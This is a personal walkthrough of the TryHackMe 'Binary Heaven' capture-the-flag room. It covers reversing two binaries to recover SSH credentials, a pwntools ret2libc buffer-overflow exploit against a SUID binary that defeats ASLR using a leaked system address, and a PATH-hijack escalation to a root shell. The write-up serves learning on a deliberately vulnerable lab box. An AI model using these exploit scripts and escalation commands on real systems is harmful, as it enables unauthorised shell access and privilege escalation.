# Binary Heaven

https://tryhackme.com/room/binaryheaven

A binex heavy room - which normally I would avoid, as its an area I have little experience in (and all of that painful). But, being a new room with no writeups and needing to keep my streak up, I dived in :) Learned a bit, so thats awesome.

A scan of the box revealed just a single port, 22. The room started with giving you two binaries to reverse in order to get the SSH credentials.

## Part 1: angel_A and angel_B

These two binaries, A and B, contained the ssh username and password respectively. They were in C and Go, i.e. angel_A was 17kb and angel_B was ~2mb :D

### angel_A

Opening this in ghidra showed code similar to the following:

```c
  printf("\x1b[36m\nSay my username >> \x1b[0m");
  fgets((char *)local_15,9,stdin);
  local_c = 0;
  while( true ) {
    if (7 < local_c) {
      puts("\x1b[32m\nCorrect! That is my name!\x1b[0m");
      return 0;
    }
    if (*(int *)(username + (long)local_c * 4) != (char)(local_15[local_c] ^ 4) + 8) break;
    local_c = local_c + 1;
  }
```

Following that username pointer back showed a block of bytes a bit like this:

```
           00104060 6b              undefined16Bh                     [0]                               XREF[3]:     Entry Point(*), main:00101202(*), 
                                                                                                                     main:00101209(R)  
           00104061 00              undefined100h                     [1]
           00104062 00              undefined100h                     [2]
           00104063 00              undefined100h                     [3]
           00104064 79              undefined179h                     [4]
           00104065 00              undefined100h                     [5]
           00104066 00              undefined100h                     [6]
           00104067 00              undefined100h                     [7]
           00104068 6d              undefined16Dh                     [8]
           00104069 00              undefined100h                     [9]
           0010406a 00              undefined100h                     [10]
           0010406b 00              undefined100h                     [11]
           0010406c 7e              undefined17Eh                     [12]
           0010406d 00              undefined100h                     [13]
           0010406e 00              undefined100h                     [14]
           ... etc
```

If you look closely, you can see every fourth byte looks a bit like its in the ascii range, which kind of matches with this code from the check: `username + (long)local_c * 4`, e.g. take the index we are up to, multiply it by four, and check against that byte. Furthermore, there was a `^ 4` permutation too. I took the bytes from the above block, put them in cyberchef, then messed with XORing until I got the username (it was obvious when the string was unmangled enough to resemble and english word).

### angel_B

This challenge was a lot harder. Being Go, opening it in ghidra showed a huge mess, and even though I found where the input is checked, it used some sort of memory check rather than string compare to do it. Furthermore, in a go binary, strings are not stored just as null terminated byte sets: instead they're all in one huge blog which, since a given go binary includes a lot of its standard library, has a huge mass of other strings in there too.

I tried a few things, including straight brute forcing the password using bash like `for i in $(cat all-english-words.txt); do (echo $i | ./angel_B && echo $i) >> result.txt; done;`, which took hours but achieved nothing. I also tried some custom go ghidra scripts from here: https://cujo.com/reverse-engineering-go-binaries-with-ghidra/, and I played around with [Delve](https://github.com/go-delve/delve), a GDB-like program for go debugging, which was fun but ultimately not useful.

In the end, the solution was simple: I reopened Ghidra, and re-examined the binary but on the analysis options screen, selected ALL the options (even the red experimental ones). For whatever reason, while making the decompiled code even more incomprehensible, this fixed the referencing of the memory address being checked at:

```c
  if ((puVar2 == (undefined *)0xb) &&
     (puVar14 = puVar2,
     runtime.memequal(CONCAT71(uVar8,uVar7),CONCAT71(uVar6,uVar5),(int)extraout_RDX,0xb,uVar9,uVar11
                      ,*puVar13,&DAT_004cad0b,0xb,cVar15), uVar4 = extraout_RDX_01, cVar15 != '\0'))
  {
```

that `DAT_004cad0b` above, when followed, led to the password in a sequence of plain ascii bytes. Good job Ghidra, got there in the end :)

## Part 2: Pwning `pwn_me`

On the box was the user flag, and a suid binary running as the user `binexgod`, called `pwn_me`. When run, this would tell you the `system` location then wait for input. The system location changed each time - ASLR (address space layout randomisation) eas enabled on the box.

This stumped me for a bit - as I said, I am not experienced at binex. I worked out the buffer size was roughly 28 characters and tried, like a blind caveman, shoving the system address into the overwrite position without luck. I went off to do some research, specifically around 'system' and binex.

This led me to ret2system, or more generally **ret2libc**, and I found a tutorial that proved excellent: https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/ret2libc. This was exactly what I needed - in fact, pwn tools was already on the box! Except... ASLR was already enabled? Meaning that I couldn't just hardcode the location of libc then add offsets...

In the end, perhaps more complicated than I needed to be, I worked out the difference in offset between system and '/bin/sh' in libc, then read the location of system from the program's out and added the offset as needed. The difference between the two was different on my test machine compared to the box, so after proving the method I had to tweak it before final exploitation. To calculate the differences I used `strings -a -t x /lib32/libc.so.6 | grep /bin/sh` to get the strings location, subbed from that `readelf -s /lib32/libc.so.6 | grep system` using a hex calculator, then added that into the script to add to the read system value. The final script (with my host machine's offset, not the targets) was:

```python
from pwn import *

p = process('./pwn_me')

p.recvline()
line2 = p.recvline()
system = int(line2.split(b': ')[1].split(b'\n')[0], 16)
binsh = system + 0x14733c

payload  = b'A' * 32
payload += p32(system)
payload += p32(0x0)
payload += p32(binsh)

p.clean()
p.sendline(payload)
p.interactive()
```

This worked and I had privesc and got binexgod's flag :)

## Part 3: Privesc to Root

The final privesc was a bit of a throwaway: there was another suid binary called `vuln`, which had the source file besides it:

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo Get out of heaven lol");
}
```

There was a script which printed an animated nyancat in the terminal (by this point I had added my public key to binexgod's ssh folder so I could just ssh in, getting a nice terminal) but I am pretty sure that was just there as a red herring. The above looked like a plain path exploit, and it was:

```bash
echo /bin/sh -p > echo
chmod +x ./echo
export PATH=/home/binexgod:$PATH
./vuln
```

And I had a root shell and the final flag :)
